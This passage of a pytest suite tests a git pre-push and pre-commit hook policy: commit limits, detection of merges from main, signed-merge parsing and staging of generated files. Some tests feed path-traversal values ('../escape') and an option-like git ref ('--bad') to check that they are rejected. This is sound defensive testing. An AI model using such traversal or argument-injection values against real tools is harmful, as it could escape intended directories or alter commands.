    _write_lf(outside, "content\n")
    monkeypatch.setattr(policy, "_generated_candidates", lambda *_args: [outside])
    assert policy.stage_generated("mcp", repo) == 2

    inside = repo / "inside"
    _write_lf(inside, "content\n")
    monkeypatch.setattr(policy, "_generated_candidates", lambda *_args: [inside])
    monkeypatch.setattr(policy, "_run_git", lambda *_args: _completed(1, stderr="failed\n"))
    assert policy.stage_generated("mcp", repo) == 1


def test_stage_generated_maps_deletion_query_failure_to_configuration_error(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    failed_query = subprocess.CompletedProcess(
        [],
        1,
        b"query output\n",
        b"query failed\n",
    )
    captured_args: list[str] = []

    def fail_query(_repo_root: Path, args: Sequence[str]) -> subprocess.CompletedProcess[bytes]:
        captured_args.extend(args)
        return failed_query

    monkeypatch.setattr(policy, "_run_git_bytes", fail_query)

    assert policy.stage_generated("mcp", tmp_path) == 2

    output = capsys.readouterr()
    assert captured_args == ["diff", "--name-only", "--diff-filter=D", "-z", "--"]
    assert output.out == "query output\n"
    assert output.err == "query failed\n"


@pytest.mark.parametrize(
    ("stdout", "stderr"),
    [
        (b"query output\n", b""),
        (b"", b"query failed\n"),
    ],
)
def test_deletion_query_failure_surfaces_each_available_stream(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
    stdout: bytes,
    stderr: bytes,
) -> None:
    monkeypatch.setattr(
        policy,
        "_run_git_bytes",
        lambda *_args, **_kwargs: subprocess.CompletedProcess(
            [],
            1,
            stdout,
            stderr,
        ),
    )

    assert policy._deleted_generated_candidates("mcp", tmp_path) is None

    output = capsys.readouterr()
    assert output.out == stdout.decode()
    assert output.err == stderr.decode()


def test_stage_generated_rejects_unsafe_tracked_deletion(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    reported_deletions = subprocess.CompletedProcess(
        [],
        0,
        b".vscode/mcp.json\0../escape\0",
        b"",
    )
    monkeypatch.setattr(policy, "_run_git_bytes", lambda *_args: reported_deletions)
    monkeypatch.setattr(
        policy,
        "_run_git",
        lambda *_args: pytest.fail("unsafe deletion reached git add"),
    )

    assert policy.stage_generated("mcp", tmp_path) == 2

    assert capsys.readouterr().err == "ERROR: unsafe tracked deletion path: ../escape\n"


def test_episode_output_parser_rejects_invalid_shapes() -> None:
    assert policy._episode_id_from_output("not json") is None
    assert policy._episode_id_from_output("[]") is None
    assert policy._episode_id_from_output('{"id": "../escape"}') is None


def test_episode_extraction_handles_missing_output_and_stage_failure(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    session = ".agents/sessions/2026-07-19-session-1-test.json"
    monkeypatch.setattr(
        policy,
        "_run_command",
        lambda *_args, **_kwargs: _completed(0, "{}"),
    )
    assert policy.extract_session_episodes([session], tmp_path) == 0

    monkeypatch.setattr(
        policy,
        "_run_command",
        lambda *_args, **_kwargs: _completed(0, '{"id": "episode-test"}'),
    )
    monkeypatch.setattr(policy, "_stage_episode", lambda *_args: 1)
    assert policy.extract_session_episodes([session], tmp_path) == 1


def test_episode_staging_handles_missing_and_symlink(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    assert policy._stage_episode("episode-missing", tmp_path) == 0

    episode = tmp_path / ".agents/memory/episodes/episode-link.json"
    episode.parent.mkdir(parents=True)
    _write_lf(episode, "{}\n")
    original_is_symlink = Path.is_symlink
    monkeypatch.setattr(
        Path,
        "is_symlink",
        lambda path: path == episode or original_is_symlink(path),
    )
    assert policy._stage_episode("episode-link", tmp_path) == 2


def test_push_ref_parser_rejects_option_like_refs() -> None:
    sha = "1" * 40
    with pytest.raises(ValueError, match="invalid ref name"):
        policy.parse_push_refs(io.StringIO(f"--bad {sha} refs/heads/a {sha}\n"))


def test_push_update_rejects_deletion_and_falls_back_to_local_main(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    deletion = policy.PushRef("(delete)", "0" * 40, "refs/heads/a", "1" * 40)
    with pytest.raises(ValueError, match="deletions"):
        policy.resolve_push_update(deletion, tmp_path)

    responses = iter([None, "main-base"])
    monkeypatch.setattr(policy, "_merge_base", lambda *_args: next(responses))
    new_ref = policy.PushRef("refs/heads/a", "1" * 40, "refs/heads/a", "0" * 40)
    assert policy.resolve_push_update(new_ref, tmp_path).base == "main-base"


def test_push_policy_reports_branch_and_input_configuration_errors(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(policy, "check_branch", lambda _root: 2)
    assert policy.check_push_refs(io.StringIO(), tmp_path) == 2

    monkeypatch.setattr(policy, "check_branch", lambda _root: 0)
    monkeypatch.setattr(policy, "_check_history_integrity", lambda _root: 0)
    assert policy.check_push_refs(io.StringIO("bad input\n"), tmp_path) == 2


def test_push_update_aggregation_returns_configuration_error(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    update = _push_update()
    monkeypatch.setattr(policy, "_check_commit_limit", lambda *_args: 2)
    monkeypatch.setattr(policy, "_check_review_marker", lambda *_args: 0)
    monkeypatch.setattr(policy, "_check_plugin_version", lambda *_args: 0)

    assert policy._check_push_updates([update], tmp_path) == 2


@pytest.mark.parametrize(
    ("git_result", "expected"),
    [
        (_completed(1, stderr="git failed\n"), 2),
        (_completed(0, "not-a-number\n"), 2),
        (_completed(0, "20\n"), 0),
    ],
)
def test_commit_limit_handles_git_count_results(
    git_result: subprocess.CompletedProcess[str],
    expected: int,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    update = _push_update(None)
    monkeypatch.setattr(policy, "_run_git", lambda *_args: git_result)

    assert policy._check_commit_limit(update, tmp_path) == expected


def test_commit_limit_blocks_when_bypass_check_fails(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    update = policy.PushUpdate(
        source=policy.PushRef("refs/heads/local", "1" * 40, "refs/tags/v1", "2" * 40),
        base="base",
        head="head",
        range_spec="base..head",
        destination_branch=None,
    )
    monkeypatch.setattr(policy, "_run_git", lambda *_args: _completed(0, "21\n"))
    monkeypatch.setattr(
        policy,
        "_run_command",
        lambda *_args, **_kwargs: _completed(1, stderr="no bypass\n"),
    )

    assert policy._check_commit_limit(update, tmp_path) == 1


def test_commit_limit_prints_bypass_explanation_with_blocking_error(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    update = policy.PushUpdate(
        source=policy.PushRef("refs/heads/local", "1" * 40, "refs/tags/v1", "2" * 40),
        base="base",
        head="head",
        range_spec="base..head",
        destination_branch=None,
    )
    monkeypatch.setattr(policy, "_run_git", lambda *_args: _completed(0, "21\n"))
    monkeypatch.setattr(
        policy,
        "_run_command",
        lambda *_args, **_kwargs: _completed(1, stdout="no open PR for local\n"),
    )

    assert policy._check_commit_limit(update, tmp_path) == 1

    captured = capsys.readouterr()
    assert captured.out == ""
    assert captured.err == "no open PR for local\nERROR: push has 21 commits, limit is 20\n"


def test_advisory_failure_prints_process_explanation_with_warning(
    capsys: pytest.CaptureFixture[str],
) -> None:
    policy._print_advisory_failure("plugin version check", _completed(2, stdout="reason\n"))

    captured = capsys.readouterr()
    assert captured.out == ""
    assert captured.err == "reason\nWARNING: plugin version check failed without blocking\n"


def test_commit_limit_relaxes_for_merge_from_main(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    update = _push_update()

    def fake_git(_root: Path, args: Sequence[str]) -> subprocess.CompletedProcess[str]:
        if args[:2] == ["rev-list", "--count"]:
            return _completed(0, "30\n")
        if args[:2] == ["rev-list", "--merges"]:
            return _completed(0, "merge-sha\n")
        if args[0] == "show" and "--format=%P" in args:
            return _completed(0, "first-parent main-parent\n")
        return _completed(0)

    monkeypatch.setattr(policy, "_run_git", fake_git)
    # main_first_parent_shas is imported into git_hook_policy's namespace; patch
    # there so _contains_main_merge sees the correct trunk without a real git repo.
    # The double takes run_git because the hook passes its own hardened runner.
    monkeypatch.setattr(
        policy,
        "main_first_parent_shas",
        lambda _root, run_git=None: frozenset(["main-parent", "older-main"]),
    )

    assert policy._check_commit_limit(update, tmp_path) == 0


def test_commit_limit_holds_when_the_merged_parent_is_off_main_trunk(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The negative control for the test above.

    Only the trunk answer changes. A parent main can reach but did not reach
    by first parent is a branch main landed, and the wider limit is refused.
    """
    update = _push_update()

    def fake_git(_root: Path, args: Sequence[str]) -> subprocess.CompletedProcess[str]:
        if args[:2] == ["rev-list", "--count"]:
            return _completed(0, "30\n")
        if args[:2] == ["rev-list", "--merges"]:
            return _completed(0, "merge-sha\n")
        if args[0] == "show" and "--format=%P" in args:
            return _completed(0, "first-parent landed-parent\n")
        return _completed(0)

    monkeypatch.setattr(policy, "_run_git", fake_git)
    # Trunk contains a different commit; "landed-parent" is not on first-parent
    # history, so the wider limit must be refused.
    monkeypatch.setattr(
        policy,
        "main_first_parent_shas",
        lambda _root, run_git=None: frozenset(["some-other-main-commit"]),
    )
    monkeypatch.setattr(
        policy,
        "_run_command",
        lambda *_args, **_kwargs: _completed(1, stderr="no bypass\n"),
    )

    assert policy._check_commit_limit(update, tmp_path) == 1


def test_main_merge_detection_handles_git_errors(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    update = _push_update()
    monkeypatch.setattr(policy, "_run_git", lambda *_args: _completed(1))

    assert not policy._contains_main_merge(update, tmp_path)
    assert not policy._merge_has_main_parent("merge", tmp_path)


def test_main_merge_detection_rejects_non_main_second_parent(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    responses = iter([_completed(0, "first other\n"), _completed(1)])
    monkeypatch.setattr(policy, "_run_git", lambda *_args: next(responses))

    assert not policy._merge_has_main_parent("merge", tmp_path)


# A session fixture in tests/conftest.py injects `commit.gpgsign=false` through
# GIT_CONFIG_COUNT, which outranks repo config. The command line outranks the
# injection in turn, so signing is requested there and nowhere else.
_SIGNING = ("-c", "commit.gpgsign=true")


def _sign_with_ssh(repo: Path) -> None:
    """Make this repo sign its commits, using the backend that needs no keyring.

    Verification is left to fail. An unknown signer still makes git print a
    verification line, which is the decoration under test.
    """
    keygen = shutil.which("ssh-keygen")
    if keygen is None:
        pytest.skip("ssh-keygen is required to build a signed history")
    key = repo / "signing-key"
    subprocess.run(
        [keygen, "-q", "-t", "ed25519", "-N", "", "-C", "t", "-f", str(key)],
        cwd=repo,
        capture_output=True,
        check=False,
    )
    if not key.with_suffix(".pub").exists():
        pytest.skip("ssh-keygen produced no key on this host")
    _git(repo, "config", "gpg.format", "ssh")
    _git(repo, "config", "user.signingkey", str(key.with_suffix(".pub")))


def _repo_with_a_signed_merge(tmp_path: Path, of_main: bool) -> tuple[Path, str]:
    """Build a repo holding one signed merge, and ask to see the signatures.

    `of_main` chooses which merge. False builds one whose second parent is a
    side branch and whose first parent is an ancestor of `origin/main`, which
    is not a merge of main and must not raise the commit limit. True builds a
    real merge of main, the case the limit is raised for.
    """
    repo = tmp_path / ("merge-of-main" if of_main else "merge-of-side")
    _init_repo(repo, branch="main")
    _sign_with_ssh(repo)
    _commit_file(repo, "base.md", "base\n")
    # Named refs only. A raw sha as a branch point is not resolvable under this
    # suite's git environment (Refs #3661).
    _git(repo, "branch", "side")
    _git(repo, "branch", "pivot")
    main_head = _commit_file(repo, "main-only.md", "main\n")
    _git(repo, "update-ref", "refs/remotes/origin/main", main_head)
    _git(repo, "checkout", "-q", "side")
    _commit_file(repo, "side-only.md", "side\n")
    if of_main:
        _git(repo, *_SIGNING, "merge", "-q", "--no-ff", "-m", "merge main", "main")
    else:
        _git(repo, "checkout", "-q", "pivot")
        _git(repo, *_SIGNING, "merge", "-q", "--no-ff", "-m", "merge side", "side")
    merge = _git(repo, "rev-parse", "HEAD").stdout.strip()
    assert "gpgsig" in _git(repo, "cat-file", "commit", merge).stdout
    # The setting under test lives in the developer's own config.
    _git(repo, "config", "log.showSignature", "true")
    return repo, merge


def test_main_merge_detection_reads_a_signed_merge(tmp_path: Path) -> None:
    """`log.showSignature` decorates `git show` as well as `git log`.

    The parents are read by splitting that output and skipping the first
    field, which is the merge's own first parent. Prefixed with a
    verification report, the first field is a word of that report instead,
    so the first parent joins the parents searched for main. A merge of a
    side branch made from a commit main already holds then reports as a
    merge of main, which doubles the commit limit this push is held to.
    """
    repo, merge = _repo_with_a_signed_merge(tmp_path, of_main=False)

    assert policy._merge_has_main_parent(merge, repo) is False


def test_main_merge_detection_still_reads_a_signed_merge_of_main(
    tmp_path: Path,
) -> None:
    """The negative control for the test above.

    Naming the signature behaviour must not stop a real merge of main from
    being found, which is the case the raised limit exists for.
    """
    repo, merge = _repo_with_a_signed_merge(tmp_path, of_main=True)

    assert policy._merge_has_main_parent(merge, repo) is True


def _repo_where_main_has_landed_a_branch(tmp_path: Path, name: str) -> Path:
    """Build a repo whose main landed a feature branch through a merge.

    `origin/main` then contains that branch's tip, but the tip is the second
    parent of the merge that landed it, not a commit on main's own trunk.
    Branch `trunk-landing` names the landing merge, and main carries one
    commit past it, so a merge of an older trunk commit can be told from a
    merge of main's tip.
    """
    repo = tmp_path / name
    _init_repo(repo, branch="main")
    _commit_file(repo, "base.md", "base\n")
    # Named refs only. A raw sha as a branch point is not resolvable under this
    # suite's git environment (Refs #3661).
    _git(repo, "branch", "local")
    _git(repo, "branch", "landed")
    _git(repo, "checkout", "-q", "landed")
    _commit_file(repo, "landed.md", "landed\n")
    _git(repo, "checkout", "-q", "main")
    _git(repo, "merge", "-q", "--no-ff", "-m", "land the feature", "landed")
    _git(repo, "branch", "trunk-landing")
    _commit_file(repo, "after.md", "after\n")
    _git(repo, "update-ref", "refs/remotes/origin/main", "HEAD")
    _git(repo, "checkout", "-q", "local")
    return repo


def _merge_into_local(repo: Path, ref: str) -> str:
    _git(repo, "merge", "-q", "--no-ff", "-m", f"merge {ref}", ref)
    return _git(repo, "rev-parse", "HEAD").stdout.strip()


def test_merging_a_branch_main_already_landed_is_not_a_merge_of_main(
    tmp_path: Path,
) -> None:
    """A landed branch is an ancestor of main, and that is not enough.

    Merging a branch main has already landed brings in no history main did
    not already hand out, so it is not the case the raised limit exists for.
    Reading the parent as main's because main can reach it lets any developer
    take the wider limit by merging a branch whose pull request has landed,
    which is ordinary git usage rather than an attack.
    """
    repo = _repo_where_main_has_landed_a_branch(tmp_path, "landed-branch")
    merge = _merge_into_local(repo, "landed")

    assert policy._merge_has_main_parent(merge, repo) is False


def test_merging_main_itself_is_still_a_merge_of_main(tmp_path: Path) -> None:
    """The negative control. The case the raised limit exists for still reads."""
    repo = _repo_where_main_has_landed_a_branch(tmp_path, "merge-of-main")
    merge = _merge_into_local(repo, "main")

    assert policy._merge_has_main_parent(merge, repo) is True


def test_merging_an_older_commit_on_main_is_a_merge_of_main(tmp_path: Path) -> None:
    """Main's trunk is not just its tip.

    A developer who merges main and then falls behind has still merged main,
    so every commit main reaches by first parent counts, not only the newest.
    """
    repo = _repo_where_main_has_landed_a_branch(tmp_path, "older-main")
    merge = _merge_into_local(repo, "trunk-landing")

    assert policy._merge_has_main_parent(merge, repo) is True


def test_a_landed_branch_does_not_widen_the_commit_limit(tmp_path: Path) -> None:
    """The consumer reads the same way the detector does.

    The limit is what this gate actually holds a push to, so the detector's
    verdict is checked where it is spent as well as where it is made.
    """
    repo = _repo_where_main_has_landed_a_branch(tmp_path, "limit-landed")
    base = _git(repo, "rev-parse", "local").stdout.strip()
    for index in range(21):
        _git(repo, "commit", "-q", "--allow-empty", "-m", f"local {index:02d}")
    head = _merge_into_local(repo, "landed")
    update = policy.PushUpdate(
        policy.PushRef("refs/heads/local", head, "refs/heads/local", base),
        base,
        head,
        f"{base}..{head}",
        "local",
    )

    assert policy._contains_main_merge(update, repo) is False


def test_a_merge_is_not_a_merge_of_main_when_there_is_no_origin_main(
    tmp_path: Path,
) -> None:
    """The edge case. An unreadable trunk must not widen the limit.

    A clone that has never fetched `origin/main` cannot say what main's trunk
    holds. Reading nothing as reaching everything would hand the wider limit
    to exactly the repos the gate knows least about.
    """
    repo = _repo_where_main_has_landed_a_branch(tmp_path, "no-origin")
    _git(repo, "update-ref", "-d", "refs/remotes/origin/main")
    merge = _merge_into_local(repo, "main")

    assert policy.main_first_parent_shas(repo) == frozenset()
    assert policy._merge_has_main_parent(merge, repo) is False


def test_the_main_trunk_is_read_once_for_one_push(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Reading main's trunk per merge walks the same history many times.

    The walk is cheap on a small repo and is not cheap on a long-lived one,
    and a push may legitimately carry many merges. Reading it once per push
    keeps the cost flat in the number of merges pushed.
    """
    update = _push_update()
    trunk_reads: list[None] = []

    def fake_first_parent_shas(_root: Path, run_git: object = None) -> frozenset[str]:
        trunk_reads.append(None)
        return frozenset(["a-main-commit"])

    def fake_git(_root: Path, args: Sequence[str]) -> subprocess.CompletedProcess[str]:
        if args[:2] == ["rev-list", "--count"]:
            return _completed(0, "5\n")
        if args[:2] == ["rev-list", "--merges"]:
            return _completed(0, "".join(f"merge-{index}\n" for index in range(25)))
        if args[0] == "show" and "--format=%P" in args:
            return _completed(0, "first-parent a-landed-branch\n")
        return _completed(0)

    monkeypatch.setattr(policy, "_run_git", fake_git)
    # main_first_parent_shas is imported into git_hook_policy's namespace; patch
    # it there so _contains_main_merge picks up the mock.
    monkeypatch.setattr(policy, "main_first_parent_shas", fake_first_parent_shas)

    assert policy._contains_main_merge(update, tmp_path) is False
    assert len(trunk_reads) == 1


def test_review_marker_reports_git_error(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    update = _push_update()
    monkeypatch.setattr(
        policy,
        "_run_git",
        lambda *_args: _completed(1, stderr="git failed\n"),
    )

    assert policy._check_review_marker(update, tmp_path) == 2


@pytest.mark.parametrize(("tool_exit", "expected"), [(1, 1), (2, 0)])
def test_plugin_version_exit_mapping(
    tool_exit: int,
    expected: int,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    update = _push_update()
    monkeypatch.setattr(
        policy,
        "_run_command",
        lambda *_args, **_kwargs: _completed(tool_exit, "out\n", "err\n"),
    )

    assert policy._check_plugin_version(update, tmp_path) == expected


def test_process_output_handles_stdout_and_stderr(capsys: pytest.CaptureFixture[str]) -> None:
    policy._print_process_output(_completed(1, "out\n", "err\n"))

    captured = capsys.readouterr()
    assert captured.out == "out\n"
    assert captured.err == "err\n"


def test_pytest_policy_cleans_hook_environment(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    captured: dict[str, object] = {}
    for key in (
        "CLAUDE_PROJECT_DIR",
        "CLAUDE_PLUGIN_ROOT",
        "COPILOT_PLUGIN_ROOT",
        "GIT_INDEX_FILE",
        "GIT_NO_REPLACE_OBJECTS",
        "GIT_OBJECT_DIRECTORY",
        "GIT_ALTERNATE_OBJECT_DIRECTORIES",
    ):
        monkeypatch.setenv(key, "leaked")

    def fake_run(*_args: object, **kwargs: object) -> subprocess.CompletedProcess[str]:
        captured.update(kwargs)
        return _completed(0)

    monkeypatch.setattr(policy.subprocess, "run", fake_run)

    assert policy.run_pytest(tmp_path) == 0
    env = captured["env"]
    assert isinstance(env, dict)
    assert env["CLAUDE_PLUGIN_ROOT"] == str(tmp_path / "src/copilot-cli")
    # The suite budget is shared across the split pytest commands, so each one
    # receives what remains of TEST_SUITE_TIMEOUT_SECONDS rather than the full
    # ceiling. Bound it instead of pinning it to the constant.
    timeout = captured["timeout"]
    assert isinstance(timeout, (int, float))
    assert 0 < timeout <= policy.TEST_SUITE_TIMEOUT_SECONDS
    for key in (
        "CLAUDE_PROJECT_DIR",
        "COPILOT_PLUGIN_ROOT",
        "GIT_INDEX_FILE",
        "GIT_NO_REPLACE_OBJECTS",
        "GIT_OBJECT_DIRECTORY",
        "GIT_ALTERNATE_OBJECT_DIRECTORIES",
    ):
        assert key not in env


def test_memory_sync_preserves_skip_and_immediate_semantics(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    calls: list[list[str]] = []

    def fake_run(
        args: Sequence[str],
        _root: Path,
        **_kwargs: object,
    ) -> subprocess.CompletedProcess[str]:
        calls.append(list(args))
        return _completed(0)

    monkeypatch.setattr(policy, "_run_command", fake_run)
    monkeypatch.setenv("SKIP_MEMORY_SYNC", "1")
    assert policy.run_memory_sync(tmp_path) == 0
    assert calls == []

    monkeypatch.delenv("SKIP_MEMORY_SYNC")
    monkeypatch.setenv("MEMORY_SYNC_IMMEDIATE", "1")
    assert policy.run_memory_sync(tmp_path) == 0
    assert calls[0][-1] == "--immediate"


def test_workflow_local_maps_secret_skip_but_blocks_tool_gap(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(
        policy,
        "_run_command",
        lambda *_args, **_kwargs: _completed(4),
    )
    assert policy.run_workflow_local([".github/workflows/test.yml"], tmp_path) == 0

    monkeypatch.setattr(
        policy,
        "_run_command",
        lambda *_args, **_kwargs: _completed(3),
    )
    assert policy.run_workflow_local([".github/workflows/test.yml"], tmp_path) == 3


def test_cli_e2e_skip_is_visible(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    monkeypatch.setenv("SKIP_CLI_E2E", "true")

    assert policy.run_cli_e2e("tests/e2e/test_cli_hook_e2e.py", tmp_path) == 0
    assert "SKIP_CLI_E2E=true" in capsys.readouterr().out


def test_advisories_warn_but_generators_block_before_staging(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(policy, "check_generated_paths", lambda *_args: 0)
    monkeypatch.setattr(
        policy,
        "_run_command",
        lambda *_args, **_kwargs: _completed(1, "out\n", "err\n"),
    )

    assert policy.run_planning_advisory(tmp_path) == 0
    assert policy.run_taste_advisory([], tmp_path) == 0
    # taste_lints.py exit 1 is a script error, not findings, so the wrapper maps
    # it to its own 2 (blocking). Exit 10 would be findings and would map to 0.
    # The swallowing of exit 1 as "findings are advisory" is issue #3779.
    assert policy.run_taste_advisory(["source.py"], tmp_path) == 2
    assert policy.generate_mcp_advisory(tmp_path) == 1
    assert policy.generate_agents_advisory(tmp_path) == 1
    assert policy.update_memory_tokens(tmp_path) == 1
    assert policy.cross_reference_memories(["memory.md"], tmp_path) == 1
    assert policy.run_memory_sync(tmp_path) == 0


def test_memory_cross_reference_requires_successful_json(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(policy, "check_generated_paths", lambda *_args: 0)

    monkeypatch.setattr(
        policy,
        "_run_command",
        lambda *_args, **_kwargs: _completed(0, '{"Success":false,"Errors":["bad"]}'),
    )
    assert policy.cross_reference_memories(["memory.md"], tmp_path) == 1

    monkeypatch.setattr(
        policy,
        "_run_command",
        lambda *_args, **_kwargs: _completed(0, "not-json"),
    )
    assert policy.cross_reference_memories(["memory.md"], tmp_path) == 2

    monkeypatch.setattr(
        policy,
        "_run_command",
        lambda *_args, **_kwargs: _completed(0, '{"Success":true,"Errors":[]}'),
    )
    assert policy.cross_reference_memories(["memory.md"], tmp_path) == 0


def test_memory_size_blocks_new_files_but_warns_for_modified_files(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    validator = tmp_path / ".claude/skills/memory/scripts/test_memory_size.py"
    validator.parent.mkdir(parents=True)
    _write_lf(validator, "pass\n")
    memory = tmp_path / ".serena/memories/large.md"
    memory.parent.mkdir(parents=True)
    _write_lf(memory, "large\n")

    monkeypatch.setattr(
        policy,
        "_staged_memory_paths",
        lambda _root, diff_filter: [".serena/memories/large.md"] if diff_filter == "A" else [],
    )
    monkeypatch.setattr(
        policy,
        "_run_command",
        lambda *_args, **_kwargs: _completed(1, "too large\n"),
    )
    assert policy.validate_memory_sizes(tmp_path) == 1

    monkeypatch.setattr(
        policy,
        "_staged_memory_paths",
        lambda _root, diff_filter: [".serena/memories/large.md"] if diff_filter == "M" else [],
    )
    assert policy.validate_memory_sizes(tmp_path) == 0


def test_generated_advisories_fail_closed_on_unsafe_outputs(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(policy, "check_generated_paths", lambda *_args: 2)

    assert policy.generate_mcp_advisory(tmp_path) == 2
    assert policy.generate_agents_advisory(tmp_path) == 2
    assert policy.update_memory_tokens(tmp_path) == 2
    assert policy.cross_reference_memories([], tmp_path) == 2
    assert policy.extract_session_episodes([], tmp_path) == 2


def test_yamllint_missing_and_empty_are_advisory(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    assert policy.run_yamllint([], tmp_path) == 0
    monkeypatch.setattr(
        policy,
        "_run_command",
        lambda *_args, **_kwargs: (_ for _ in ()).throw(FileNotFoundError()),
    )
    assert policy.run_yamllint(["config.yml"], tmp_path) == 0


def test_cli_e2e_runs_with_clean_plugin_environment(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.delenv("SKIP_CLI_E2E", raising=False)
    monkeypatch.setattr(policy.shutil, "which", lambda name: name if name == "copilot" else None)
    captured: dict[str, object] = {}

    def fake_run(*_args: object, **kwargs: object) -> subprocess.CompletedProcess[str]:
        captured.update(kwargs)
        return _completed(0)

    monkeypatch.setattr(policy.subprocess, "run", fake_run)

    assert policy.run_cli_e2e("tests/e2e/test.py", tmp_path) == 0
    env = captured["env"]
    assert isinstance(env, dict)
    assert env["RUN_CLI_E2E"] == "1"
    assert captured["timeout"] == policy.CLI_E2E_TIMEOUT_SECONDS
    assert "CLAUDE_PROJECT_DIR" not in env
    assert "COPILOT_PLUGIN_ROOT" not in env


def test_cli_e2e_without_cli_is_advisory(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.delenv("SKIP_CLI_E2E", raising=False)
    monkeypatch.setattr(policy.shutil, "which", lambda _name: None)

    assert policy.run_cli_e2e("tests/e2e/test.py", tmp_path) == 0


def test_session_and_observation_helpers_aggregate_without_blocking_advisory(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    validator_results = iter([_completed(0), _completed(1)])

    def _dispatch(command, *_args, **_kwargs):
        if command[0] == "git":
            return _completed(0, stdout="deadbee\n")
        return next(validator_results)

    monkeypatch.setattr(policy, "_run_command", _dispatch)
    assert policy.validate_branch_sessions(["one.json", "two.json"], tmp_path) == 1

    monkeypatch.setattr(policy, "_run_command", lambda *_args, **_kwargs: _completed(1))
    assert policy.sync_observations(["memory-observations.md"], tmp_path) == 0


def test_placeholder_identity_handles_malformed_deletion_and_failure(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    assert policy.check_placeholder_identities(io.StringIO("bad\n"), tmp_path) == 2
    zero = "0" * 40
    old = "1" * 40
    deletion = io.StringIO(f"(delete) {zero} refs/heads/old {old}\n")
    assert policy.check_placeholder_identities(deletion, tmp_path) == 0

    ref = policy.PushRef("refs/heads/a", old, "refs/heads/a", "2" * 40)
    monkeypatch.setattr(policy, "parse_push_refs", lambda _stream: [ref])
    monkeypatch.setattr(
        policy,
        "resolve_push_update",
        lambda *_args: policy.PushUpdate(ref, "base", old, "base..head", "a"),
    )
    monkeypatch.setattr(policy, "_run_command", lambda *_args, **_kwargs: _completed(1))
    assert policy.check_placeholder_identities(io.StringIO(), tmp_path) == 1


def test_additions_advisory_handles_warning_and_git_error(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    monkeypatch.setattr(
        policy, "_run_git", lambda *_args: _completed(0, "501\t0\tfile\n-\t-\tbinary\n")
    )
    assert policy.additions_advisory(tmp_path) == 0
    assert "501 lines" in capsys.readouterr().out

    monkeypatch.setattr(policy, "_run_git", lambda *_args: _completed(1))
    assert policy.additions_advisory(tmp_path) == 0
    assert "could not calculate" in capsys.readouterr().err


def test_bot_cascade_advisory_handles_missing_and_active_pr(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    monkeypatch.setattr(
        policy,
        "_run_command",
        lambda *_args, **_kwargs: (_ for _ in ()).throw(FileNotFoundError()),
    )
    assert policy.bot_cascade_advisory(tmp_path) == 0

    responses = iter(
        [
            _completed(0, "7\n"),
            _completed(0, '{"fetched_pages_complete": true, "unresolved_count": 2}'),
            _completed(1),
        ]
    )
    monkeypatch.setattr(policy, "_run_command", lambda *_args, **_kwargs: next(responses))
    assert policy.bot_cascade_advisory(tmp_path) == 0
    output = capsys.readouterr().out
    assert "2 unresolved" in output
    assert "review query skipped" in output


def test_bot_cascade_handles_no_pr_invalid_json_and_timestamps(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    monkeypatch.setattr(policy, "_run_command", lambda *_args, **_kwargs: _completed(1))
    assert policy.bot_cascade_advisory(tmp_path) == 0
    policy._warn_unresolved_threads("not json", "8")

    monkeypatch.setattr(policy, "_run_command", lambda *_args, **_kwargs: _completed(0, "bad\n"))
    policy._warn_recent_bot_review("8", tmp_path)
    monkeypatch.setattr(policy, "_run_command", lambda *_args, **_kwargs: _completed(0, ""))
    policy._warn_recent_bot_review("8", tmp_path)
    assert "timestamp parse skipped" in capsys.readouterr().out


def test_safe_output_path_rejects_traversal_and_resolved_escape(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
